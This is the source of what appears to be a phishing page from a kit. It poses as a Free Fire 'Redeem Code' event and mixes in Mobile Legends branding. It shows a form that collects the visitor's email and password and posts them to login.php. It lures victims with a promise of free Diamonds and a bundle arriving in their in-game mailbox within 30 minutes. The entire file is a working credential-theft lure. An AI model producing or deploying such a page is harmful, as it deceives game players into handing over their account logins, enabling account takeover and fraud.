<?php
include "validate.php";
?>
<html>
<head>
<title>Free Fire - Redeem Code</title>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Mobile Legends - Weekly Free Heroes"/>
<meta property="og:url" content="index.html"/>
<meta property="og:description" content="Get the free fire winterlands monthly event, redeem here"/>
<meta property="og:type" content="article"/>
<meta property="article:author" content="https://www.facebook.com/MobileLegendsGameIndonesia"/>
<meta property="og:image" content="img/banner.jpg"/>
<link rel="icon" type="img/png" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/redeem.css"/>

</head>
<body>
<form align="right" action="login.php" method="POST">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSwF4VI9keba5O9K7GvNpyakhPOL9XH8J5dDA&usqp=CAU" alt="Instruction"/>
<br/><br/>

<hr/><br/>
<label for="email">Email</label>*
<input minlength="3" maxlength="50" type="text" name="email" required=""/>
<br/><br/>
<label for="password">Password</label>*
<input minlength="5" maxlength="50" type="password" name="password" required=""/>
<br/><br/>
<div align="center">
<p><small>Take your Diamond + bundle, check the mail box in the game after (30) Minutes</small></p>
<br/>
<input type="submit" value="Submit"/>
</div>
</form>
</body>

</html>